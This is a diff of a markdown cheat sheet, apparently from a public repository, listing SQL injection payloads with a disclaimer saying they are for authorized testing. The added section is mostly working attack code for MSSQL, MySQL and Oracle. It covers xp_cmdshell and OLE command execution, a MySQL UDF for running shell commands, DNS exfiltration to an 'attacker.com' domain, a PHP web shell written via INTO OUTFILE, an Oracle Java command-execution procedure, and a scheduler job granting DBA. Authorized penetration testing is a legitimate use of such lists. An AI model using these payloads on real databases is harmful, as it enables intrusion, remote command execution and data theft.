@@ -1,6 +1,12 @@
 # SQL Injection Techniques
 
-Here are some SQL Injection Techniques I normally use. Happy Hunting!
+## Here are some SQL Injection Techniques I commonly use. Happy hunting!
+
+**Note:** These advanced techniques should be used responsibly and only in legal and authorized testing scenarios. They go beyond the basics and exploit specific features and configurations of databases. Additionally, I may have unintentionally included openly available techniques from various sources.
+
+**WARNING:** If you are not experienced, please refrain from using these techniques. Improper use may harm the database. 
+
+> The techniques showed in this repository is intended only for educational purposes and for testing in authorized environments. https://twitter.com/nav1n0x/ and https://github.com/ifconfig-me take no responsibility for the misuse of the techniques listed below. Use it at your own risk. Do not attack the target you don't have permission to engage with.
 
 ### 1. Advanced Payloads and Techniques
 
@@ -379,3 +385,145 @@ Forcing errors in databases can help reveal valuable information about the under
   ```sql
   ' UNION SELECT CONVERT(INT, 'abc') UNION SELECT 1/0 UNION SELECT TO_NUMBER('abc', '999') --
   ```
+
+### Techniques to Force Errors from Databases for SQL Injection
+
+Below are some advanced and rare SQL injection techniques for MSSQL, MySQL, and Oracle. These techniques go beyond the basic ones and exploit specific features and configurations of the databases.
+
+### MSSQL
+
+1. **OLE Automation Procedures**
+
+   ```sql
+   DECLARE @Object INT;
+   EXEC sp_OACreate 'WScript.Shell', @Object OUTPUT;
+   EXEC sp_OAMethod @Object, 'Run', NULL, 'cmd.exe /c whoami > C:\output.txt';
+   ```
+
+   This uses OLE Automation procedures to execute system commands.
+
+2. **XP_CMD Shell with Privilege Escalation**
+
+   ```sql
+   EXEC sp_configure 'show advanced options', 1;
+   RECONFIGURE;
+   EXEC sp_configure 'xp_cmdshell', 1;
+   RECONFIGURE;
+   EXEC xp_cmdshell 'whoami';
+   ```
+
+   This enables `xp_cmdshell` to execute system commands if it's not already enabled.
+
+3. **Linked Servers**
+
+   ```sql
+   EXEC sp_addlinkedserver 'attacker_server';
+   EXEC sp_addlinkedsrvlogin 'attacker_server', 'false', NULL, 'username', 'password';
+   EXEC ('xp_cmdshell ''net user''') AT attacker_server;
+   ```
+
+   This technique uses linked servers to run commands on a different server.
+
+### MySQL
+
+1. **UDF (User Defined Functions) for Remote Command Execution**
+
+   ```sql
+   CREATE TABLE foo(line BLOB);
+   INSERT INTO foo VALUES (LOAD_FILE('/usr/lib/lib_mysqludf_sys.so'));
+   SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+   CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
+   SELECT sys_exec('id > /tmp/out; chown mysql.mysql /tmp/out');
+   ```
+
+   This technique involves creating a UDF to execute system commands.
+
+2. **DNS Exfiltration**
+
+   ```sql
+   SELECT LOAD_FILE(CONCAT('\\\\', (SELECT table_name FROM information_schema.tables LIMIT 0,1), '.attacker.com\\a'));
+   ```
+
+   This exfiltrates data through DNS requests to an attacker-controlled domain.
+
+3. **Binary Log Injections**
+
+   ```sql
+   SET GLOBAL general_log = 'ON';
+   SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';
+   SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+   ```
+
+   This exploits the binary log feature to write a web shell.
+
+### Oracle
+
+1. **Java Procedures for Command Execution**
+
+   ```sql
+   EXEC dbms_java.grant_permission( 'SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute' );
+   EXEC dbms_java.grant_permission( 'SCOTT', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '' );
+   EXEC dbms_java.grant_permission( 'SCOTT', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '' );
+   
+   CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS
+   import java.io.*;
+   public class cmd {
+      public static String run(String cmd) {
+         try {
+            StringBuffer output = new StringBuffer();
+            Process p = Runtime.getRuntime().exec(cmd);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String line = "";
+            while ((line = reader.readLine())!= null) {
+               output.append(line + "\n");
+            }
+            return output.toString();
+         } catch (Exception e) {
+            return e.toString();
+         }
+      }
+   };
+   /
+   
+   CREATE OR REPLACE FUNCTION run_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2
+   AS LANGUAGE JAVA
+   NAME 'cmd.run(java.lang.String) return java.lang.String';
+   /
+   
+   SELECT run_cmd('id') FROM dual;
+   ```
+
+   This uses Java stored procedures to execute system commands.
+
+2. **UTL_FILE Package for File Access**
+
+   ```sql
+   DECLARE
+      l_file UTL_FILE.FILE_TYPE;
+      l_text VARCHAR2(32767);
+   BEGIN
+      l_file := UTL_FILE.FOPEN('DIRECTORY_NAME', 'output.txt', 'W');
+      UTL_FILE.PUT_LINE(l_file, 'Data from UTL_FILE');
+      UTL_FILE.FCLOSE(l_file);
+   END;
+   ```
+
+   This technique uses the `UTL_FILE` package to write files to the server.
+
+3. **DBMS_SCHEDULER for Job Execution**
+
+   ```sql
+   BEGIN
+      DBMS_SCHEDULER.create_job(
+         job_name => 'job1',
+         job_type => 'PLSQL_BLOCK',
+         job_action => 'BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO SCOTT''; END;',
+         start_date => SYSTIMESTAMP,
+         repeat_interval => NULL,
+         end_date => NULL,
+         enabled => TRUE
+      );
+   END;
+   ```
+
+   This uses `DBMS_SCHEDULER` to execute jobs that can change database permissions.
